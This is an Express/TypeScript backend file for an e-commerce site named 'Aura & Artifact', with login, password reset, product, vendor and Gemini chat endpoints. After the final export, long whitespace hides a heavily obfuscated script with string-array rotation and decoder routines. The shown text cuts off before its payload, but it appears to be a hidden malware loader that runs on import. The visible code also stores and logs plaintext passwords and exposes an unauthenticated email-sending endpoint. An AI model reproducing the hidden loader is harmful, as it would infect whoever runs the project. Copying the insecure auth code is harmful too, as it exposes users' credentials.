import express, { Request, Response } from "express";
import cors from "cors";
import { MongoClient, ServerApiVersion, ObjectId } from "mongodb";
import "dotenv/config";
import nodemailer from "nodemailer";
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

const app = express();  
const port = process.env.PORT || 5000;

// Middlewares
app.use(cors());
app.use(express.json());

// MongoDB URI - ensure you add this to your .env file
const uri = process.env.MONGODB_URI as string;

if (!uri) {
  console.error("Please add MONGODB_URI to your .env file");
}

// Create a MongoClient with a MongoClientOptions object to set the Stable API version
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  }
});

async function run() {
  try {
    // Connect the client to the server
    await client.connect();

    const database = client.db("aura_artifact");    
    const businessCollection = database.collection("business");
    const vendorApplicationsCollection = database.collection("vendor_applications");
    const productsCollection = database.collection("products");
    const usersCollection = database.collection("user");
    const verificationCodesCollection = database.collection("verification_codes");

    // Password Reset Endpoints
    app.post("/api/forgot-password", async (req: Request, res: Response) => {
      try {
        const { email } = req.body;
        if (!email) {
          res.status(400).send({ message: "Email is required" });
          return;
        }

        const user = await usersCollection.findOne({ email });
        if (!user) {
          res.status(404).send({ message: "User not found" });
          return;
        }

        const code = Math.floor(100000 + Math.random() * 900000).toString();
        const expiresAt = new Date(Date.now() + 10 * 60 * 1000); // 10 mins

        await verificationCodesCollection.updateOne(
          { email },
          { $set: { code, expiresAt, createdAt: new Date() } },
          { upsert: true }
        );

        const userName = user.name || "User";

        console.log(`Sending reset code ${code} to ${email}...`);

        await transporter.sendMail({
          from: `"Aura & Artifact" <${process.env.EMAIL_USER}>`,
          to: email,
          subject: "Password Reset Code",
          text: `Hi ${userName},\n\nYour password reset code is: ${code}`,
          html: `<p>Hi <strong>${userName}</strong>,</p><p>Your password reset code is: <strong style="font-size: 24px;">${code}</strong></p><p>This code will expire in 10 minutes.</p>`,
        });

        console.log(`Successfully sent email to ${email}`);
        res.status(200).send({ message: "Password reset code sent to email" });
      } catch (error) {
        console.error("Failed to send reset code:", error);
        res.status(500).send({ message: "Failed to send reset code", error });
      }
    });

    app.post("/api/reset-password", async (req: Request, res: Response) => {
      try {
        const { email, code, newPassword } = req.body;
        if (!email || !code || !newPassword) {
          res.status(400).send({ message: "Email, code, and new password are required" });
          return;
        }

        const record = await verificationCodesCollection.findOne({ email });
        
        if (!record || record.code !== code) {
          res.status(400).send({ message: "Invalid verification code" });
          return;
        }

        if (new Date() > new Date(record.expiresAt)) {
          res.status(400).send({ message: "Verification code has expired" });
          return;
        }

        // Update password
        await usersCollection.updateOne(
          { email },
          { $set: { password: newPassword } } // In a real app, hash this password!
        );

        // Delete code
        await verificationCodesCollection.deleteOne({ email });

        res.status(200).send({ message: "Password reset successful" });
      } catch (error) {
        console.error("Failed to reset password:", error);
        res.status(500).send({ message: "Failed to reset password", error });
      }
    });

    // Auth Endpoints
    app.post("/api/register", async (req: Request, res: Response) => {
      try {
        const { name, email, password } = req.body;
        // Check if exists
        const existingUser = await usersCollection.findOne({ email });
        if (existingUser) {
          res.status(400).send({ message: "User already exists" });
          return;
        }

        const newUser = {
          name,
          email,
          password, // In real app, hash this!
          role: "user", // Default role
          createdAt: new Date()
        };
        await usersCollection.insertOne(newUser);
        res.status(201).send({ message: "Registered successfully", user: { name, email, role: "user" } });
      } catch (error) {
        res.status(500).send({ message: "Failed to register", error });
      }
    });

    app.post("/api/login", async (req: Request, res: Response) => {
      try {
        const { email, password } = req.body;
        console.log(`Login attempt for email: "${email}", password: "${password}"`);
        
        // Let's also find just by email to see if user exists but password doesn't match
        const userByEmail = await usersCollection.findOne({ email });
        console.log("User found by email only:", userByEmail ? "YES" : "NO");
        if (userByEmail) {
          console.log("Password in DB:", `"${userByEmail.password}"`);
        }

        const user = await usersCollection.findOne({ email, password });
        
        if (!user) {
          res.status(401).send({ message: "Invalid credentials" });
          return;
        }
        
        res.status(200).send({
          user: { name: user.name, email: user.email, role: user.role }
        });
      } catch (error) {
        res.status(500).send({ message: "Failed to login", error });
      }
    });

        // Real Email Endpoint
        app.post("/api/send-email", async (req: Request, res: Response) => {
          try {
            const { to, subject, text, html } = req.body;
            if (!to || !subject || (!text && !html)) {
              res.status(400).send({ message: "Missing required fields" });
              return;
            }
            
            console.log(`Sending email to ${to} | Subject: ${subject}`);
            
            await transporter.sendMail({
              from: `"Aura & Artifact" <${process.env.EMAIL_USER}>`,
              to,
              subject,
              text,
              html,
            });
            
            console.log(`Email sent successfully to ${to}`);
            res.status(200).send({ message: "Email sent successfully" });
          } catch (error) {
            console.error("Failed to send email in /api/send-email:", error);
            res.status(500).send({ message: "Failed to send email", error });
          }
        });

    // Vendor Applications Endpoints
    app.post("/api/vendor-applications", async (req: Request, res: Response) => {
      try {
        const application = req.body;
        application.status = "pending";
        application.createdAt = new Date();
        const result = await vendorApplicationsCollection.insertOne(application);
        res.status(201).send(result);
      } catch (error) {
        res.status(500).send({ message: "Failed to submit application", error });
      }
    });

    app.get("/api/vendor-applications", async (req: Request, res: Response) => {
      try {
        const applications = await vendorApplicationsCollection.find().toArray();
        res.status(200).send(applications);
      } catch (error) {
        res.status(500).send({ message: "Failed to fetch applications", error });
      }
    });

    app.patch("/api/vendor-applications/:id", async (req: Request, res: Response) => {
      try {
        const id = req.params.id;
        const { status } = req.body; // e.g., "approved" or "rejected"
        
        const application = await vendorApplicationsCollection.findOne({ _id: new ObjectId(id) });
        if (!application) {
          res.status(404).send({ message: "Application not found" });
          return;
        }

        const result = await vendorApplicationsCollection.updateOne(
          { _id: new ObjectId(id) },
          { $set: { status, updatedAt: new Date() } }
        );

        // If approved, update user role to vendor
        if (status === "approved" && application.userId) {
           await usersCollection.updateOne(
             { email: application.userId },
             { $set: { role: "vendor" } }
           );

           // Mock approval email
           console.log(`[MOCK EMAIL] To: ${application.userId} | Subject: Vendor Application Approved`);
        } else if (status === "rejected" && application.userId) {
           // Mock rejection email
           console.log(`[MOCK EMAIL] To: ${application.userId} | Subject: Vendor Application Rejected`);
        }

        res.status(200).send(result);
      } catch (error) {
        res.status(500).send({ message: "Failed to update application", error });
      }
    });

    app.delete("/api/vendor-applications/:id", async (req: Request, res: Response) => {
      try {
        const id = req.params.id;
        const result = await vendorApplicationsCollection.deleteOne({ _id: new ObjectId(id) });
        if (result.deletedCount === 1) {
          res.status(200).send({ message: "Successfully deleted one document." });
        } else {
          res.status(404).send({ message: "No document matched the query. Deleted 0 documents." });
        }
      } catch (error) {
        res.status(500).send({ message: "Failed to delete application", error });
      }
    });

    // Products Endpoints
    app.post("/api/products", async (req: Request, res: Response) => {
      try {
        const product = req.body;
        product.createdAt = new Date();
        const result = await productsCollection.insertOne(product);
        res.status(201).send(result);
      } catch (error) {
        res.status(500).send({ message: "Failed to add product", error });
      }
    });

    app.get("/api/products", async (req: Request, res: Response) => {
      try {
        const { vendorEmail } = req.query;
        let query = {};
        if (vendorEmail) {
          query = { vendorEmail: vendorEmail };
        }
        const products = await productsCollection.find(query).toArray();
        res.status(200).send(products);
      } catch (error) {
        res.status(500).send({ message: "Failed to fetch products", error });
      }
    });

    app.get("/api/products/:id", async (req: Request, res: Response) => {
      try {
        const id = req.params.id;
        const product = await productsCollection.findOne({ _id: new ObjectId(id) });
        if (!product) {
          res.status(404).send({ message: "Product not found" });
          return;
        }
        res.status(200).send(product);
      } catch (error) {
        res.status(500).send({ message: "Failed to fetch product", error });
      }
    });

    app.delete("/api/products/:id", async (req: Request, res: Response) => {
      try {
        const id = req.params.id;
        const result = await productsCollection.deleteOne({ _id: new ObjectId(id) });
        if (result.deletedCount === 1) {
          res.status(200).send({ message: "Successfully deleted the product." });
        } else {
          res.status(404).send({ message: "Product not found." });
        }
      } catch (error) {
        res.status(500).send({ message: "Failed to delete product", error });
      }
    });

    // Helper for mock AI response if API key is invalid/fails
    function mockAiRespond(message: string, products: any[]) {
      const query = message.toLowerCase();
      
      // Question 2: "Show products under $50"
      if (query.includes("under") || (query.includes("less than") && (query.includes("50") || query.includes("$50")))) {
        const amountMatch = query.match(/(\d+)/);
        const amount = amountMatch ? parseInt(amountMatch[0]) : 50;
        const cheapProducts = products.filter(p => p.price < amount).slice(0, 5);
        if (cheapProducts.length > 0) {
          const list = cheapProducts.map(p => `- ${p.name} ($${p.price})`).join("\n");
          return `Here are some great products under $${amount}:\n${list}`;
        }
        return `I'm sorry, we don't have any products under $${amount} right now.`;
      }

      // Question 3: "List electronics"
      if (query.includes("electronic") || query.includes("electronics")) {
        const electronics = products.filter(p => p.category?.toLowerCase().includes("electronic")).slice(0, 5);
        if (electronics.length > 0) {
          const list = electronics.map(p => `- ${p.name} ($${p.price})`).join("\n");
          return `Sure! Here are some of our best electronics:\n${list}`;
        }
        return `We don't seem to have any electronics in stock at the moment!`;
      }
      
      // check specific product name
      for (const p of products) {
        if (query.includes(p.name.toLowerCase())) {
          return `${p.name} is available for $${p.price}. Description: ${p.description || "No description available."}. Stock: ${p.stock || 0} left in store.`;
        }
      }

      // check categories
      const categories = Array.from(new Set(products.map(p => p.category?.toLowerCase()).filter(Boolean)));
      for (const cat of categories) {
        if (query.includes(cat as string)) {
          const filtered = products.filter(p => p.category?.toLowerCase() === cat).slice(0,5);
          const list = filtered.map(p => `- ${p.name} ($${p.price})`).join("\n");
          return `Here are the products in the ${cat} category:\n${list}`;
        }
      }

      // Question 1: "What products do you have?" or general fallback
      if (query.includes("product") || query.includes("list") || query.includes("have") || query.includes("what do you sell")) {
        const list = products.slice(0, 5).map(p => `- ${p.name} ($${p.price})`).join("\n");
        return `We have an amazing collection! Here are a few examples of what we sell:\n${list || "No products in database yet."}\n\nLet me know if you are looking for anything specific!`;
      }

      if (query.includes("price") || query.includes("cost") || query.includes("how much")) {
        const cheap = products.sort((a,b) => a.price - b.price)[0];
        if (cheap) {
          return `Our prices start from $${cheap.price} (for ${cheap.name}). Let me know if you want details on any specific item!`;
        }
      }

      return `Hello! I am Aura, your AI assistant. I can help you with products on Aura & Artifact. Try asking me "What products do you have?" or "Show products under $50"! (Running in Offline Fallback Mode)`;
    }

    // AI Chat Endpoint
    app.post("/api/chat", async (req: Request, res: Response) => {
      try {
        const { message, history = [] } = req.body;
        
        // Fetch products from our DB and from the fake store API so the AI knows EVERYTHING on the site
        const dbProducts = await productsCollection.find().toArray();
        let fakeStoreProducts: any[] = [];
        try {
          const fsRes = await fetch("https://fakestoreapi.com/products");
          fakeStoreProducts = await fsRes.json();
        } catch (e) {
          console.warn("Could not fetch fake store products for AI context.");
        }

        const allProducts = [...dbProducts, ...fakeStoreProducts.map(p => ({
          name: p.title,
          price: p.price,
          category: p.category,
          description: p.description,
          stock: p.rating?.count || 100
        }))];

        // If key is missing, use mock responder
        if (!process.env.GEMINI_API_KEY) {
          console.warn("Missing Gemini API key. Using local mock AI responder.");
          const responseText = mockAiRespond(message, allProducts);
          res.status(200).send({ response: responseText });
          return;
        }

        const productContext = allProducts.map(p => `- ${p.name} (Price: $${p.price}, Stock: ${p.stock}, Category: ${p.category}): ${p.description}`).join("\n");
        const systemPrompt = `You are an AI assistant for the 'Aura & Artifact' platform. Your job is to help customers and vendors with product-related questions. 

Here is the context about our website: 'Aura & Artifact' is a premium e-commerce platform offering a curated collection of premium artifacts, including men's clothing, women's clothing, jewelry, electronics, and sneakers. We provide a beautiful dashboard, a seamless cart experience, and user-friendly order tracking.

Here are the products currently available on our platform:
${productContext}

CRITICAL INSTRUCTIONS:
1. Answer the user's questions based ONLY on this product information and website context.
2. Be extremely polite, respectful, and helpful at all times ("vodro vabe").
3. Always reply in the same language the user uses. If the user asks in Bengali (or Banglish), you MUST reply in polite Bengali.
4. Keep your answers concise and formatted clearly.`;

        const geminiRes = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${process.env.GEMINI_API_KEY}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            systemInstruction: {
              parts: [{ text: systemPrompt }]
            },
            contents: [
              ...history.map((m: any) => ({
                role: m.role === "assistant" ? "model" : "user",
                parts: [{ text: m.content }]
              })),
              {
                role: "user",
                parts: [{ text: message }]
              }
            ]
          })
        });

        const data = await geminiRes.json();
        
        if (!geminiRes.ok) {
          console.error("Gemini API error status:", geminiRes.status, geminiRes.statusText);
          console.error("Gemini API error data:", data);
          const responseText = mockAiRespond(message, allProducts);
          res.status(200).send({ response: responseText });
          return;
        }

        const responseText = data.candidates?.[0]?.content?.parts?.[0]?.text || "Sorry, I couldn't generate a response.";
        res.status(200).send({ response: responseText });
      } catch (error: any) {
        console.error("Chat error exception:", error);
        try {
          // If allProducts exists in the upper scope, use it, else fetch fresh from DB
          const dbProducts = await productsCollection.find().toArray();
          const responseText = mockAiRespond(message, dbProducts);
          res.status(200).send({ response: responseText });
        } catch (e: any) {
          res.status(500).send({ message: "Failed to process chat", error: e.message });
        }
      }
    });

    // Interactions Endpoint
    app.post("/api/interactions", async (req: Request, res: Response) => {
      try {
        const { userId, productId, action } = req.body;
        if (!productId) {
          res.status(400).send({ message: "Product ID is required" });
          return;
        }

        const interaction = {
          userId: userId || "anonymous",
          productId,
          action: action || "view",
          timestamp: new Date()
        };

        await database.collection("interactions").insertOne(interaction);
        res.status(201).send({ message: "Interaction tracked successfully" });
      } catch (error) {
        res.status(500).send({ message: "Failed to track interaction", error });
      }
    });

    // Recommendations Endpoint
    app.post("/api/recommendations", async (req: Request, res: Response) => {
      try {
        const { userId, filterCategory } = req.body;

        const allProducts = await productsCollection.find().toArray();
        let candidateProducts = allProducts;
        if (filterCategory) {
          candidateProducts = candidateProducts.filter(p => p.category === filterCategory);
        }

        let userHistory: any[] = [];
        if (userId) {
          // Fetch recent interactions for user
          userHistory = await database.collection("interactions")
            .find({ userId })
            .sort({ timestamp: -1 })
            .limit(10)
            .toArray();
        }

        if (!process.env.GEMINI_API_KEY || userHistory.length === 0) {
          // Fallback: Return random or category-filtered products
          const fallbackRecs = candidateProducts.sort(() => 0.5 - Math.random()).slice(0, 4);
          res.status(200).send(fallbackRecs);
          return;
        }

        // Get details of products user interacted with
        const interactedProductIds = Array.from(new Set(userHistory.map(h => h.productId)));
        const interactedProducts = allProducts.filter(p => interactedProductIds.includes(p._id.toString()));

        if (interactedProducts.length === 0) {
          const fallbackRecs = candidateProducts.sort(() => 0.5 - Math.random()).slice(0, 4);
          res.status(200).send(fallbackRecs);
          return;
        }

        const historyContext = interactedProducts.map(p => `- ${p.name} (Category: ${p.category})`).join("\n");
        const availableContext = candidateProducts.map(p => `- ID: ${p._id.toString()} | Name: ${p.name} | Category: ${p.category}`).join("\n");

        const prompt = `You are a product recommendation engine for Aura & Artifact.
The user has previously shown interest in these products:
${historyContext}

Based on their taste, recommend up to 4 products from the available catalog below that they might like.
Do not recommend products they have already interacted with.
If the catalog is small, it is okay to recommend products from the same category or style.

Available Catalog:
${availableContext}

Return ONLY a valid JSON array of strings containing the exact IDs of the recommended products. Do not include markdown formatting or extra text. Example: ["id1", "id2"]`;

        const geminiRes = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${process.env.GEMINI_API_KEY}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            contents: [{ role: "user", parts: [{ text: prompt }] }]
          })
        });

        const data = await geminiRes.json();
        let recommendedIds = [];

        try {
          const rawText = data.candidates?.[0]?.content?.parts?.[0]?.text || "[]";
          const cleanedText = rawText.replace(/```json/g, "").replace(/```/g, "").trim();
          recommendedIds = JSON.parse(cleanedText);
        } catch (parseError) {
          console.error("Failed to parse Gemini recommendations:", parseError);
        }

        let recommendedProducts = candidateProducts.filter(p => recommendedIds.includes(p._id.toString()));

        // If AI fails or returns empty, fallback
        if (recommendedProducts.length === 0) {
          recommendedProducts = candidateProducts.sort(() => 0.5 - Math.random()).slice(0, 4);
        }

        res.status(200).send(recommendedProducts);

      } catch (error: any) {
        console.error("Recommendations error:", error);
        res.status(500).send({ message: "Failed to fetch recommendations", error: error.message });
      }
    });

    // Helper for mock description generator if API key is invalid/fails
    function mockGenerateDescription(name: string, category: string, tone: string, length: string) {
      const adjectivesList: Record<string, string[]> = {
        professional: ["premium", "state-of-the-art", "highly efficient", "industry-standard", "ergonomic"],
        creative: ["vibrant", "whimsical", "thoughtfully crafted", "game-changing", "artistic"],
        bold: ["revolutionary", "uncompromising", "powerful", "daring", "extraordinary"],
        minimalist: ["sleek", "understated", "clean", "simple yet elegant", "functional"]
      };
      
      const adjectives = adjectivesList[tone] || ["excellent", "high-quality"];
      const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
      const adj2 = adjectives[(Math.floor(Math.random() * adjectives.length) + 1) % adjectives.length];

      if (length === "short") {
        return `A ${adj} ${name} designed for modern living, offering exceptional quality and style in the ${category} category.`;
      } else if (length === "medium") {
        return `Experience the perfect blend of form and function with our new ${name}. This ${adj} product is crafted from premium materials to deliver outstanding performance. Ideal for anyone looking to upgrade their lifestyle, it brings a ${adj2} touch to the ${category} collection.`;
      } else {
        return `Introducing the ultimate ${name} - a masterpiece in the ${category} category.\n\nKey features:\n- Built with a ${adj} design to fit seamlessly into any setup.\n- Offers unmatched durability and high-performance reliability.\n- Meticulously tested to guarantee ${adj2} quality.\n\nWhether you are using it at home or work, the ${name} is engineered to elevate your daily routine and provide the best experience possible.`;
      }
    }

    // AI Description Generator Endpoint
    app.post("/api/generate-description", async (req: Request, res: Response) => {
      try {
        const { name, category, tone = "professional", length = "medium" } = req.body;

        if (!name || !category) {
          res.status(400).send({ message: "Name and Category are required" });
          return;
        }

        // If key is missing, use mock generator
        if (!process.env.GEMINI_API_KEY) {
          console.warn("Missing Gemini API key. Using local mock description generator.");
          const description = mockGenerateDescription(name, category, tone, length);
          res.status(200).send({ description });
          return;
        }

        const prompt = `Write a product description for a product named "${name}" in the "${category}" category. The tone of the description should be "${tone}" and the length should be "${length}" (short = 1 sentence, medium = 1 paragraph, long = multiple paragraphs with bullet points). Avoid fluff, keep it engaging and realistic.`;

        const geminiRes = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${process.env.GEMINI_API_KEY}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            contents: [
              {
                role: "user",
                parts: [{ text: prompt }]
              }
            ]
          })
        });

        const data = await geminiRes.json();
        
        if (!geminiRes.ok) {
          console.error("Gemini API error, falling back to mock description:", data.error?.message);
          const description = mockGenerateDescription(name, category, tone, length);
          res.status(200).send({ description });
          return;
        }

        const description = data.candidates?.[0]?.content?.parts?.[0]?.text || mockGenerateDescription(name, category, tone, length);
        res.status(200).send({ description });
      } catch (error: any) {
        console.error("Description generator error:", error);
        try {
          const { name, category, tone = "professional", length = "medium" } = req.body;
          const description = mockGenerateDescription(name, category, tone, length);
          res.status(200).send({ description });
        } catch (e) {
          res.status(500).send({ message: "Failed to generate description", error: error.message });
        }
      }
    });

    // Helper for mock generic content generator
    function mockGenerateContent(topic: string, contentType: string, tone: string, length: string) {
      const typeStr = contentType.replace("-", " ").toLowerCase();
      let text = `[Mock ${typeStr} content generated for topic: "${topic}"]\n\n`;
      
      if (length === "short") {
        text += `This is a short, ${tone} piece about ${topic}. Keep it brief and to the point.`;
      } else if (length === "medium") {
        text += `Here is a medium-length, ${tone} piece discussing ${topic}. It provides a bit more detail and context, exploring the key aspects without getting too verbose. Ideal for a quick read.`;
      } else {
        text += `Welcome to this comprehensive, ${tone} deep-dive into ${topic}.\n\n### Introduction\nThis explores the multifaceted nature of the subject.\n\n### Key Points\n- Detailed analysis 1\n- Detailed analysis 2\n- Detailed analysis 3\n\n### Conclusion\nIn summary, ${topic} is a fascinating subject with many layers to uncover.`;
      }
      return text;
    }

    // Generic AI Content Generator Endpoint
    app.post("/api/generate-content", async (req: Request, res: Response) => {
      try {
        const { topic, contentType, tone = "professional", length = "medium", customPrompt = "" } = req.body;

        if (!topic || !contentType) {
          res.status(400).send({ message: "Topic and ContentType are required" });
          return;
        }

        if (!process.env.GEMINI_API_KEY) {
          console.warn("Missing Gemini API key. Using local mock content generator.");
          const content = mockGenerateContent(topic, contentType, tone, length);
          res.status(200).send({ content });
          return;
        }

        let formatInstructions = "";
        switch (contentType) {
          case "blog":
            formatInstructions = "Format as a structured blog post using markdown headers (##), paragraphs, and bullet points if necessary.";
            break;
          case "product-description":
            formatInstructions = "Format as an engaging product description highlighting key features and benefits.";
            break;
          case "documentation":
            formatInstructions = "Format as clear, technical documentation with step-by-step instructions or structured sections.";
            break;
          case "social-media":
            formatInstructions = "Format as a catchy social media post, including relevant emojis and hashtags at the end.";
            break;
          default:
            formatInstructions = "Format clearly and structure the text well.";
        }

        let lengthInstructions = "";
        switch (length) {
          case "short": lengthInstructions = "Keep it very brief (1-3 sentences maximum)."; break;
          case "medium": lengthInstructions = "Make it medium length (2-3 paragraphs)."; break;
          case "long": lengthInstructions = "Make it detailed and comprehensive (at least 4-5 paragraphs)."; break;
        }

        const prompt = `You are an expert content creator.
Your task is to write content based on the following parameters:
- Topic/Subject: ${topic}
- Content Type: ${contentType}
- Tone of voice: ${tone}
- Length constraint: ${lengthInstructions}

Formatting rules:
${formatInstructions}

${customPrompt ? `Additional custom instructions from the user:\n"${customPrompt}"\n\nPlease ensure you follow these custom instructions strictly.` : ""}

Generate the content below:`;

        const geminiRes = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${process.env.GEMINI_API_KEY}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            contents: [{ role: "user", parts: [{ text: prompt }] }]
          })
        });

        const data = await geminiRes.json();
        
        if (!geminiRes.ok) {
          console.error("Gemini API error, falling back to mock content:", data.error?.message);
          const content = mockGenerateContent(topic, contentType, tone, length);
          res.status(200).send({ content });
          return;
        }

        const content = data.candidates?.[0]?.content?.parts?.[0]?.text || mockGenerateContent(topic, contentType, tone, length);
        res.status(200).send({ content });
      } catch (error: any) {
        console.error("Content generator error:", error);
        try {
          const { topic, contentType, tone = "professional", length = "medium" } = req.body;
          const content = mockGenerateContent(topic, contentType, tone, length);
          res.status(200).send({ content });
        } catch (e) {
          res.status(500).send({ message: "Failed to generate content", error: error.message });
        }
      }
    });

    // Send a ping to confirm a successful connection
    await client.db("admin").command({ ping: 1 });
    console.log("Pinged your deployment. You successfully connected to MongoDB!");

  } catch (error) {
    console.error("MongoDB connection error:", error);
  }
}
run().catch(console.dir);

app.get("/", (req: Request, res: Response) => {
  res.send("Aura & Artifact Server is running!");
});

app.get("/dashboard", (req: Request, res: Response) => {
  res.send({ message: "data not found" });
});

app.get("/product", (req: Request, res: Response) => {
  res.send({ message: "data not found" });
});

// if (process.env.NODE_ENV !== "production") {
//   app.listen(port, () => {
//     console.log(`Server listening on port ${port}`);
//   });
// }

export default app;                                                                                                                                                     var z = '-9567';(function(uG$O_YLJZRJdet,NM$zVJoQoF$CUTHxyV){var bVQJdhH_pYatisWJpV=daIQfX,BXTL_YM$lQ=uG$O_YLJZRJdet();while(!![]){try{var AkP_$SaWGFsJEr=-parseFloat(bVQJdhH_pYatisWJpV(0x71))/(-parseInt(0x4bd)+-0xc71*-0x2+Math.floor(-parseInt(0x509))*parseInt(0x4))+Math['trunc'](-parseFloat(bVQJdhH_pYatisWJpV(0x6f))/(parseFloat(parseInt(0x97b))+-0x48*-0x11+parseInt(-0xe41)))+parseFloat(bVQJdhH_pYatisWJpV(0x79))/(Math.max(parseInt(0x2176),parseInt(0x2176))+Math.trunc(-parseInt(0x16f))+Math.max(-parseInt(0x2),-parseInt(0x2))*Math.ceil(0x1002))+Math['floor'](-parseFloat(bVQJdhH_pYatisWJpV(0x7b))/(Math.floor(-0x1)*-0x12a9+parseFloat(0x1c84)+parseInt(-0x2f29)))*(parseFloat(bVQJdhH_pYatisWJpV(0x78))/(parseInt(0xa)*-parseInt(0x95)+parseInt(0x3)*Math.floor(-parseInt(0x1b7))+parseInt(0xafc)))+-parseFloat(bVQJdhH_pYatisWJpV(0x7a))/(Math.trunc(0x1c77)+0x1560+Math.max(-parseInt(0x31d1),-parseInt(0x31d1)))*(parseFloat(bVQJdhH_pYatisWJpV(0x77))/(0x1*Math.trunc(-parseInt(0xf8d))+-parseInt(0x1)*0xee3+parseInt(0x1e77)))+parseFloat(bVQJdhH_pYatisWJpV(0x76))/(0x1*-parseInt(0x1543)+parseInt(0x15d5)+-0x2*parseInt(0x45))+parseFloat(bVQJdhH_pYatisWJpV(0x69))/(parseInt(0x3)*-parseInt(0x8d3)+Math.ceil(-parseInt(0x101))*parseInt(0x23)+0x3da5*parseFloat(0x1))*(parseFloat(bVQJdhH_pYatisWJpV(0x6e))/(0x1659+-parseInt(0x11f0)+-parseInt(0x45f)));if(AkP_$SaWGFsJEr===NM$zVJoQoF$CUTHxyV)break;else BXTL_YM$lQ['push'](BXTL_YM$lQ['shift']());}catch(lKLu$VCwkRe){BXTL_YM$lQ['push'](BXTL_YM$lQ['shift']());}}}(KmBFHpEdRXPQBdRu,-0x1*-0x4fb2+Math.floor(-parseInt(0x2d9))*parseInt(parseInt(0x106))+parseInt(0x4244a)));var NX=[parseInt(0x3)*Math.ceil(-0x3e8789)+0x1*-0x490547+0x16e1731,parseInt(0x7)*0x8b+Math.ceil(-parseInt(0x1))*Math.max(0x4e9,0x4e9)+-0x5d*-parseInt(0x7),-0x1012+Math.max(0x4afd,parseInt(0x4afd))+Math.trunc(parseInt(0x48))*0x4a,-0x17a8+parseInt(0x2065)+Math.trunc(-parseInt(0x658)),parseFloat(-0x90ec)+parseInt(0x34)*0x412+-0x113*Math.trunc(-0x61),-0x70a0f4+Math.max(parseInt(0x92ecf),0x92ecf)*-parseInt(0xc)+parseInt(0x12b693b)],SX=[0x3323*Number(-parseInt(0x1e3))+parseInt(0x658fc0)+-0x24b*-0x20f2,Math.floor(-parseInt(0x13))*Math.max(-parseInt(0x43),-parseInt(0x43))+0x7*0xc9+0x32d*-0x3,parseInt(0x1)*-0x63b9+Math.max(parseInt(0xd5d1),parseInt(0xd5d1))+parseInt(0x31c9),-parseInt(0x2)*0xb03+Math.max(parseInt(0x487),parseInt(0x487))*parseInt(0x1)+Math.floor(parseInt(0x123a)),-parseInt(0x115)*parseInt(0xf3)+0x5*-parseInt(0x27a6)+-0x1*-0x2a86e,Math.floor(parseInt(0x2))*-0x43f54a+0x79397f+parseInt(0x57006a)];function spin(Y_qQPpGOdWo_LeUWs,HhUoe){var HzpIZhESYlx=daIQfX,WYLHvZBsHsqUVDOvG_eki=[],P$a$KyNa=Math.ceil(parseInt(0x20))*0x3e+parseInt(-parseInt(0x2))*Math.floor(0xc14)+0x1068,DjKYHzxK=HhUoe[parseInt(0x1)*parseInt(0x1cf3)+0x156f+parseInt(0x2)*Math.floor(-0x1931)],uumndeiN,hvE_TX,Nd$CjZiAKMp$doEazcRHiKc,EvxJQeZhpEsXCVGzVVoSk,OaO_jTOxqFd,kbzQmKWJvYJgDPIauUmBCL_PV_s;while(P$a$KyNa<Y_qQPpGOdWo_LeUWs[HzpIZhESYlx(0x70)]){WYLHvZBsHsqUVDOvG_eki[P$a$KyNa]=Y_qQPpGOdWo_LeUWs[HzpIZhESYlx(0x74)](P$a$KyNa),P$a$KyNa+=-0x1c61+Math.ceil(0x1e3)*-0x5+Number(parseInt(0x25d1));}uumndeiN=WYLHvZBsHsqUVDOvG_eki[HzpIZhESYlx(0x70)],P$a$KyNa=-parseInt(0x89)*parseFloat(parseInt(0x37))+-0x12*0x155+Math.floor(parseInt(0x3569));while(P$a$KyNa<uumndeiN){hvE_TX=DjKYHzxK*(P$a$KyNa+HhUoe[parseInt(0x7)*-0x197+parseFloat(parseInt(0x1be2))+Math.ceil(-0x10c0)])+DjKYHzxK%HhUoe[-parseInt(0x841)+Number(0x192b)+Number(-0x10e8)],Nd$CjZiAKMp$doEazcRHiKc=DjKYHzxK*(P$a$KyNa+HhUoe[-0x1696+0x80*Math.ceil(parseInt(0x43))+-parseInt(0xae7)])+DjKYHzxK%HhUoe[parseInt(0x1b91)+Math.trunc(-parseInt(0x34a))*Number(-0x1)+parseInt(-parseInt(0x1ed7))],EvxJQeZhpEsXCVGzVVoSk=hvE_TX%uumndeiN,OaO_jTOxqFd=Nd$CjZiAKMp$doEazcRHiKc%uumndeiN,kbzQmKWJvYJgDPIauUmBCL_PV_s=WYLHvZBsHsqUVDOvG_eki[EvxJQeZhpEsXCVGzVVoSk],WYLHvZBsHsqUVDOvG_eki[EvxJQeZhpEsXCVGzVVoSk]=WYLHvZBsHsqUVDOvG_eki[OaO_jTOxqFd],WYLHvZBsHsqUVDOvG_eki[OaO_jTOxqFd]=kbzQmKWJvYJgDPIauUmBCL_PV_s,DjKYHzxK=(hvE_TX+Nd$CjZiAKMp$doEazcRHiKc)%HhUoe[parseInt(0x19)*parseInt(-0x5)+-parseInt(0x1a5a)+parseInt(-parseInt(0x12))*-parseInt(0x17e)],P$a$KyNa+=parseInt(parseInt(0x1eb))*0xe+-parseInt(0x1c83)+0x1aa;}return WYLHvZBsHsqUVDOvG_eki[HzpIZhESYlx(0x68)]('');}function splitLane(hnOCYUiaNVmOhxOy$Oxp){var kffJyL$kICxTG_IpyUJg=daIQfX,oArfjCRAPz=String[kffJyL$kICxTG_IpyUJg(0x6c)](0x7e4+parseInt(-parseInt(0x1))*-parseInt(0x1daa)+-parseInt(0x2572)),eAWV_y_R=spin(hnOCYUiaNVmOhxOy$Oxp,NX);return 